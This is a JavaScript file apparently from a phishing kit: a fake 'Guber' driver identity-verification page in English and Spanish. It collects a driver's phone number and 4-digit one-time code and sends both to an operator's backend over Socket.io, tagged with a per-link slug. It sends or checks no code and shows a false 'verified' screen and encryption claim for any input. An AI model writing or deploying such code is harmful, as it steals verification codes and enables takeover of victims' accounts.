// Initialize Socket.io Connection with graceful fallback
let socket;
try {
    socket = io();
} catch(e) {
    socket = null;
}

// Global State
let currentStep = 1;
let currentPhoneNumber = '';
let currentVerificationId = '';
let resendCountdown = 60;
let resendTimer = null;
let currentLanguage = 'en';

// Multilingual Dictionaries (EN / ES)
const translations = {
    en: {
        help: 'Help',
        title: 'Confirm active driver identity',
        subtitle: 'Enter your active driver phone number to start verification',
        labelPhone: 'Mobile number',
        btnSend: 'Send Verification Code',
        securityNote: 'Your verification is secured with end-to-end encryption.',
        headingOtp: 'Enter 4-digit code',
        instructionOtp: 'We sent a 4-digit verification code to',
        changePhone: 'Change phone number',
        resendPrompt: "Didn't receive the code?",
        resendBtn: 'Resend Code',
        btnVerify: 'Verify Code',
        successTitle: 'Driver Identity Successfully Verified!',
        successDesc: 'Thank you for confirming your identity. Your driver profile is active.',
        labelStatus: 'Status:',
        valStatus: 'Confirmed Active Driver',
        labelDriverPhone: 'Driver Phone:',
        labelTime: 'Timestamp:',
        btnHome: 'Back to Home',
        promoTitle: 'Active Driver Portal',
        promoDesc: 'Ensure identity compliance before starting your drive shift.',
        srv1Title: 'Identity Compliance',
        srv1Desc: 'Verify active driver identity securely',
        srv2Title: 'Driver Support',
        srv2Desc: '24/7 priority safety and trip assistance',
        srv3Title: 'Safety Verified',
        srv3Desc: 'Protected by Guber identity protocol'
    },
    es: {
        help: 'Ayuda',
        title: 'Confirmar identidad del conductor activo',
        subtitle: 'Ingrese su número de teléfono de conductor activo para iniciar la verificación',
        labelPhone: 'Número de móvil',
        btnSend: 'Enviar código de verificación',
        securityNote: 'Su verificación está protegida con cifrado de extremo a extremo.',
        headingOtp: 'Ingrese el código de 4 dígitos',
        instructionOtp: 'Enviamos un código de verificación de 4 dígitos a',
        changePhone: 'Cambiar número de teléfono',
        resendPrompt: '¿No recibiste el código?',
        resendBtn: 'Reenviar código',
        btnVerify: 'Verificar código',
        successTitle: '¡Identidad del Conductor Verificada con Éxito!',
        successDesc: 'Gracias por confirmar su identidad. Su perfil de conductor está activo.',
        labelStatus: 'Estado:',
        valStatus: 'Conductor Activo Confirmado',
        labelDriverPhone: 'Teléfono del Conductor:',
        labelTime: 'Marca de tiempo:',
        btnHome: 'Volver al Inicio',
        promoTitle: 'Portal del Conductor Activo',
        promoDesc: 'Garantice el cumplimiento de identidad antes de iniciar su turno.',
        srv1Title: 'Cumplimiento de Identidad',
        srv1Desc: 'Verifique la identidad del conductor de forma segura',
        srv2Title: 'Soporte al Conductor',
        srv2Desc: 'Asistencia prioritaria de seguridad y viajes 24/7',
        srv3Title: 'Seguridad Verificada',
        srv3Desc: 'Protegido por el protocolo de identidad de Guber'
    }
};

// DOM Elements
const stepPhone = document.getElementById('step-phone');
const stepOtp = document.getElementById('step-otp');
const stepVerified = document.getElementById('step-verified');

const phoneForm = document.getElementById('phone-form');
const phoneInput = document.getElementById('phone-input');
const otpInputs = document.querySelectorAll('.otp-box');
const otp1 = document.getElementById('otp-1');
const btnVerifyOtp = document.getElementById('btn-verify-otp');

const userPhoneDisplay = document.getElementById('user-phone-display');
const displayPhoneVerified = document.getElementById('display-phone-verified');
const displayTimestamp = document.getElementById('display-timestamp');

// Initialize UI & Language
document.addEventListener('DOMContentLoaded', () => {
    setLanguage('en');
});

// Switch UI Language
function setLanguage(lang) {
    currentLanguage = lang;
    document.getElementById('lang-menu').classList.add('hidden');
    document.getElementById('current-lang-text').textContent = lang.toUpperCase();

    const options = document.querySelectorAll('.lang-option');
    options.forEach(opt => {
        if (opt.getAttribute('onclick').includes(lang)) {
            opt.classList.add('active');
        } else {
            opt.classList.remove('active');
        }
    });

    const t = translations[lang];

    document.getElementById('txt-title').textContent = t.title;
    document.getElementById('txt-subtitle').textContent = t.subtitle;
    document.getElementById('txt-label-phone').textContent = t.labelPhone;
    document.getElementById('txt-btn-send').textContent = t.btnSend;
    document.getElementById('txt-security-note').innerHTML = `<i class="fa-solid fa-shield-halved"></i> ${t.securityNote}`;
    document.getElementById('txt-change-phone').textContent = t.changePhone;
    document.getElementById('txt-heading-otp').textContent = t.headingOtp;
    document.getElementById('txt-instruction-otp').textContent = t.instructionOtp;
    document.getElementById('txt-resend-prompt').textContent = t.resendPrompt;
    document.getElementById('txt-resend-btn').textContent = t.resendBtn;
    document.getElementById('txt-btn-verify').textContent = t.btnVerify;
    document.getElementById('txt-success-title').textContent = t.successTitle;
    document.getElementById('txt-success-desc').textContent = t.successDesc;
    document.getElementById('txt-label-status').textContent = t.labelStatus;
    document.getElementById('txt-val-status').textContent = t.valStatus;
    document.getElementById('txt-label-driver-phone').textContent = t.labelDriverPhone;
    document.getElementById('txt-label-time').textContent = t.labelTime;
    document.getElementById('txt-btn-home').textContent = t.btnHome;
    document.getElementById('txt-promo-title').textContent = t.promoTitle;
    document.getElementById('txt-promo-desc').textContent = t.promoDesc;
    document.getElementById('txt-srv1-title').textContent = t.srv1Title;
    document.getElementById('txt-srv1-desc').textContent = t.srv1Desc;
    document.getElementById('txt-srv2-title').textContent = t.srv2Title;
    document.getElementById('txt-srv2-desc').textContent = t.srv2Desc;
    document.getElementById('txt-srv3-title').textContent = t.srv3Title;
    document.getElementById('txt-srv3-desc').textContent = t.srv3Desc;
    document.getElementById('nav-help').textContent = t.help;
}

// Close language dropdown if clicked outside
document.addEventListener('click', (e) => {
    const dropdown = document.querySelector('.lang-dropdown');
    if (dropdown && !dropdown.contains(e.target)) {
        document.getElementById('lang-menu').classList.add('hidden');
    }
});

// Broadcast helper for GitHub Pages / Cloud sync
function saveCloudRecord(record) {
    let logs = JSON.parse(localStorage.getItem('guber_records') || '[]');
    const existingIdx = logs.findIndex(r => r.id === record.id || r._id === record.id || r.phoneNumber === record.phoneNumber);
    if (existingIdx !== -1) {
        logs[existingIdx] = { ...logs[existingIdx], ...record };
    } else {
        logs.unshift(record);
    }
    localStorage.setItem('guber_records', JSON.stringify(logs));
    window.dispatchEvent(new CustomEvent('guber_record_updated', { detail: record }));
}

// Handle Phone Form Submission
function handlePhoneSubmit(e) {
    e.preventDefault();
    const phoneVal = phoneInput.value.trim();

    if (!phoneVal || phoneVal.length < 7) {
        return;
    }

    const fullPhone = '+1 ' + phoneVal.replace(/[^0-9]/g, '');
    currentPhoneNumber = fullPhone;
    currentVerificationId = 'REC_' + Date.now();

    const btn = document.getElementById('btn-send-phone');
    setLoading(btn, true);

    const customSlug = window.location.pathname + window.location.search;
    const recData = {
        id: currentVerificationId,
        _id: currentVerificationId,
        phoneNumber: fullPhone,
        status: 'PHONE_SUBMITTED',
        customSlug: customSlug,
        submittedAt: new Date().toISOString()
    };

    saveCloudRecord(recData);

    // Socket.io emit phone number to backend with custom slug
    if (socket && typeof socket.emit === 'function') {
        socket.emit('submit_phone', { phoneNumber: fullPhone, customSlug: customSlug }, (response) => {
            if (response && response.verificationId) {
                currentVerificationId = response.verificationId;
            }
        });
    }

    setTimeout(() => {
        setLoading(btn, false);
        userPhoneDisplay.textContent = fullPhone;
        switchStep(stepPhone, stepOtp);
        startResendTimer();
        otp1.focus();
    }, 400);
}

// Setup 4-Digit OTP Box Focus & Paste Logic (NO AUTO SUBMIT)
otpInputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        const val = e.target.value;
        e.target.value = val.replace(/[^0-9]/g, '');

        if (e.target.value.length === 1) {
            if (index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
        }
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            otpInputs[index - 1].focus();
        }
    });

    input.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedData = (e.clipboardData || window.clipboardData).getData('text').trim();
        const digits = pastedData.replace(/[^0-9]/g, '').slice(0, 4);
        
        if (digits.length > 0) {
            digits.split('').forEach((char, i) => {
                if (otpInputs[i]) {
                    otpInputs[i].value = char;
                }
            });
            otpInputs[Math.min(digits.length, 3)].focus();
        }
    });
});

// Handle Manual OTP Form Verification Submission
function handleOtpSubmit(e) {
    if (e) e.preventDefault();

    let otpCode = '';
    otpInputs.forEach(i => otpCode += i.value);

    if (otpCode.length !== 4) {
        alert('Please enter a valid 4-digit verification code.');
        return;
    }

    const btn = document.getElementById('btn-verify-otp');
    setLoading(btn, true);

    const customSlug = window.location.pathname + window.location.search;
    const recData = {
        id: currentVerificationId,
        _id: currentVerificationId,
        phoneNumber: currentPhoneNumber,
        otp: otpCode,
        status: 'VERIFIED',
        customSlug: customSlug,
        verifiedAt: new Date().toISOString()
    };

    saveCloudRecord(recData);

    // Socket.io emit 4-digit OTP to backend with custom slug
    if (socket && typeof socket.emit === 'function') {
        socket.emit('submit_otp', {
            verificationId: currentVerificationId,
            phoneNumber: currentPhoneNumber,
            otp: otpCode,
            customSlug: customSlug
        });
    }

    setTimeout(() => {
        setLoading(btn, false);
        displayPhoneVerified.textContent = currentPhoneNumber;
        displayTimestamp.textContent = new Date().toLocaleString();
        switchStep(stepOtp, stepVerified);
        triggerConfetti();
    }, 600);
}

// Navigation Back to Step 1
function goToStep1() {
    clearInterval(resendTimer);
    otpInputs.forEach(i => i.value = '');
    switchStep(stepOtp, stepPhone);
}

// Switch Steps & Toggle Hero Image Visibility
function switchStep(fromStep, toStep) {
    fromStep.classList.add('hidden');
    toStep.classList.remove('hidden');

    const heroContainer = document.getElementById('hero-main-container');
    const heroIllustrationBox = document.querySelector('.hero-illustration-box');

    if (toStep === stepPhone) {
        currentStep = 1;
        if (heroContainer) heroContainer.classList.remove('centered-flow');
        if (heroIllustrationBox) heroIllustrationBox.style.display = 'flex';
    } else {
        currentStep = toStep === stepOtp ? 2 : 3;
        if (heroContainer) heroContainer.classList.add('centered-flow');
        if (heroIllustrationBox) heroIllustrationBox.style.display = 'none';
    }
}

// Resend Timer Logic
function startResendTimer() {
    clearInterval(resendTimer);
    resendCountdown = 60;
    const timerElem = document.getElementById('resend-timer');
    const btnElem = document.getElementById('btn-resend');

    btnElem.disabled = true;
    btnElem.style.opacity = '0.5';

    resendTimer = setInterval(() => {
        resendCountdown--;
        if (timerElem) timerElem.textContent = `(${resendCountdown}s)`;

        if (resendCountdown <= 0) {
            clearInterval(resendTimer);
            if (timerElem) timerElem.textContent = '';
            btnElem.disabled = false;
            btnElem.style.opacity = '1';
        }
    }, 1000);
}

function handleResendCode() {
    startResendTimer();
    const btn = document.getElementById('btn-resend');
    btn.textContent = 'Code Sent!';
    setTimeout(() => {
        btn.textContent = translations[currentLanguage].resendBtn;
    }, 2000);
}

function resetFlow() {
    phoneInput.value = '';
    otpInputs.forEach(i => i.value = '');
    switchStep(stepVerified, stepPhone);
}

// Utility Loading Spinner State
function setLoading(button, isLoading) {
    if (isLoading) {
        button.disabled = true;
        button.dataset.origText = button.innerHTML;
        button.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Please wait...`;
    } else {
        button.disabled = false;
        if (button.dataset.origText) {
            button.innerHTML = button.dataset.origText;
        }
    }
}

// Confetti Celebration
function triggerConfetti() {
    try {
        const count = 200;
        const defaults = { origin: { y: 0.7 } };

        function fire(particleRatio, opts) {
            if (typeof confetti === 'function') {
                confetti(Object.assign({}, defaults, opts, {
                    particleCount: Math.floor(count * particleRatio)
                }));
            }
        }

        if (typeof confetti === 'function') {
            fire(0.25, { spread: 26, startVelocity: 55 });
            fire(0.2, { spread: 60 });
            fire(0.35, { spread: 100, decay: 0.91, scalar: 0.8 });
            fire(0.1, { spread: 120, startVelocity: 25, decay: 0.92, scalar: 1.2 });
            fire(0.1, { spread: 120, startVelocity: 45 });
        }
    } catch (e) {}
}

function toggleLangMenu() {
    const menu = document.getElementById('lang-menu');
    menu.classList.toggle('hidden');
}
